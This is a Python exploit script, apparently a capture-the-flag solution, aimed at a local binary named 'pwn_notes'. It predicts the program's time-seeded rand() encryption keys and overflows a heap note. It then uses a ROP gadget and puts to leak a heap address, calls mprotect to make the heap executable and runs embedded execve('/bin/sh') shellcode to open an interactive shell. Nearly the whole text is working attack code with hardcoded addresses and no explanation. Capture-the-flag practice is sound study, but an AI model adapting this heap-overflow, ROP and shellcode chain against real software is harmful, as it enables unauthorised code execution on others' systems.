from ptrlib import *
import ctypes

glibc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc-2.27.so')
glibc.srand(glibc.time(0))

def create(size, data):
    key = [glibc.rand() for i in range(0x20)]
    output = b''
    for i in range(0, min(len(data), 0x80), 4):
        output += p32(u32(data[i:i+4]) ^ key[i//4])
    if len(data) > 0x80:
        output += data[0x80:]
    sock.sendlineafter("Choice: ", "1")
    sock.recvuntil("slot #")
    id = int(sock.recvline())
    sock.sendlineafter("length: ", str(size))
    sock.sendafter("encrypt: ", output)
    return id, key

def edit(index, data):
    sock.sendlineafter("Choice: ", "2")
    sock.sendlineafter("edit: ", str(index))
    sock.sendafter("encrypt: ", data)
    return

def destroy(index):
    sock.sendlineafter("Choice: ", "3")
    sock.sendlineafter("destroy: ", str(index))
    return

def show(index):
    sock.sendlineafter("Choice: ", "4")
    sock.sendlineafter("print: ", index)
    return

sock = Process("./pwn_notes")
rop_add_esp_24_pop_pop = 0x0807d8a8
addr_main = 0x8048f64
addr_puts = 0x8050730
addr_mprotect = 0x806f980
addr_note = 0x80eea20
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90\x90"

# prepare
payload = b'A' * 0x80
payload += p32(0x84 + 8 + 4)[:3]
create(0x83, payload)    # 0
create(0x80, shellcode)  # 1

# leak heap address
payload = b'A' * 0x80
payload += p32(0x84 + 8 + 4)
payload += p32(0) + p32(0x111)
payload += p32(rop_add_esp_24_pop_pop)
edit(0, payload)
payload = b'1\x00AA' + b'A' * 8
payload += p32(addr_puts)
payload += p32(addr_main)
payload += p32(addr_note)
show(payload)
addr_heap = u32(sock.recvline()[:4])
logger.info("note[0] = " + hex(addr_heap))

# mprotect and run shellcode
payload = b'1\x00AA' + b'A' * 8
payload += p32(addr_mprotect)
payload += p32(addr_heap + 0x110 + 0x84)
payload += p32(addr_heap & 0xfffff000)
payload += p32(0x1000)
payload += p32(0b111)
show(payload)

sock.interactive()
